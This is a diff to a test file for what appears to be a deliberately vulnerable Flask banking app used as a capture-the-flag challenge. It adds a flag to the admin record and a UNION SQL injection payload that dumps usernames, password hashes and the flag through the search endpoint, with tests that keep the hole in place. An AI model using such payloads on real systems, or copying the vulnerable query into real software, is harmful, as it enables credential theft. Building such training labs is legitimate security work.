@@ -26,7 +26,8 @@ def app():
             User(id=1, username="attacker", email="attacker@test.local",
                  password_hash=generate_password_hash("Password123!"), role="customer"),
             User(id=3, username="admin", email="admin@test.local",
-                 password_hash=generate_password_hash("ChangeMe_Admin!2024"), role="admin"),
+                 password_hash=generate_password_hash("ChangeMe_Admin!2024"), role="admin",
+                 secret_note="DARKVAULT{uni0n_s3l3ct_st4r_fr0m_secrets}"),
         ])
         db.session.add_all([
             Transaction(customer_id=1, description="Grocery Store Purchase", amount=45.20, txn_date=datetime.utcnow()),
@@ -65,12 +66,13 @@ def test_sqli_union_extracts_password_hashes(client):
     """THE VULNERABILITY. Locks in that the search endpoint can be
     used to exfiltrate arbitrary table contents via UNION."""
     _login(client)
-    payload = "nonexistent%') UNION SELECT id, username || ':' || password_hash, 0, NULL FROM users -- "
+    payload = "nonexistent%') UNION SELECT id, username || ':' || password_hash || ':' || COALESCE(secret_note, ''), 0, NULL FROM users -- "
     resp = client.get("/transactions/search", query_string={"q": payload})
     assert resp.status_code == 200
     data = resp.get_json()
     descriptions = [row["description"] for row in data]
     assert any("admin:" in d for d in descriptions)
+    assert any("DARKVAULT{uni0n_s3l3ct_st4r_fr0m_secrets}" in d for d in descriptions)
 
 
 def test_safe_list_endpoint_unaffected_by_injection_attempt(client):
